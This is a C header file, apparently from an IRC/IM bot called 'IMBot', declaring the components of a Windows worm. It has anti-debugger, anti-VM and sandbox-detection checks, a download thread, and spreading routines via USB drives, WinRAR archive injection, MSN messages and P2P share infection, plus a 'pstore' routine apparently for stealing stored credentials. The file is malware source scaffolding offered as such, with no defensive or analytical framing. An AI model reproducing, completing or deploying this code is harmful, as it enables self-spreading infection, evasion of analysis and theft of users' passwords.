/*
 ___    _____  __________          __  
|   |  /     \ \______   \  ____ _/  __
|   | /  \ /  \ |    |  _/ /  _ \\   __\
|   |/    Y    \|    |   \(  <_> )|  |
|___|\____|__  /|______  / \____/ |__|
             \/        \/
*/
////////////////////////
// Security
#ifndef NO_ANTIVM
BOOL AntiSandBox();
typedef long	NTSTATUS;
#define NTAPI	__stdcall
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_SUCCESS    ((NTSTATUS)0L)
typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION
{
    BOOLEAN DebuggerEnabled;
    BOOLEAN DebuggerNotPresent;
} SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;
typedef struct _PROCESS_DEBUG_PORT_INFO
{
    HANDLE DebugPort;
} PROCESS_DEBUG_PORT_INFO;
enum SYSTEM_INFORMATION_CLASS	{ SystemKernelDebuggerInformation = 35 };
enum PROCESS_INFO_CLASS			{ ProcessDebugPort                = 7  };
typedef NTSTATUS  (NTAPI *ZW_QUERY_SYSTEM_INFORMATION)	(IN SYSTEM_INFORMATION_CLASS SystemInformationClass, IN OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength);
typedef NTSTATUS  (NTAPI *ZW_QUERY_INFORMATION_PROCESS)	(IN HANDLE ProcessHandle, IN PROCESS_INFO_CLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength);
bool IsDebuggerRunning(HANDLE hProcess);
bool IsProcessRunningUnderVM();
bool IsInSandbox();
#endif
/////////////////////////
// Download
DWORD WINAPI DownloadThread(LPVOID param);
/////////////////////////
// USB Spread
#ifndef NO_USB
DWORD WINAPI USB_Spreader(LPVOID param);
#endif
/////////////////////////
// WinRAR Spread
#ifndef NO_WINRAR
BOOL AddToRar(char RarFile[],char FileToAdd[],char PackedFileName[],DWORD Attributes);
void RandomString(char *dst,int len,BOOL Gen_Numbers);
DWORD WINAPI RarWorm(LPVOID xvoid);
HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter);
#endif
/////////////////////////
// MSN Spread
#ifndef NO_MSN
DWORD WINAPI ImMsg(LPVOID param);
DWORD WINAPI ImMsg2(LPVOID param);
DWORD WINAPI ImMsg3(LPVOID param);
#endif
/////////////////////////
// P2P Spread
#ifndef NO_P2P
struct Peer2PeerInfo_s 
{ 
   char szDirectory[MAX_PATH]; 
   char szFilePath[MAX_PATH];
   char szProgdir[MAX_PATH];
}; 
bool InfectP2P();
#endif
/////////////////////////
// Pstore
#ifndef NO_PSTORE
DWORD WINAPI pstore (LPVOID param);
#endif
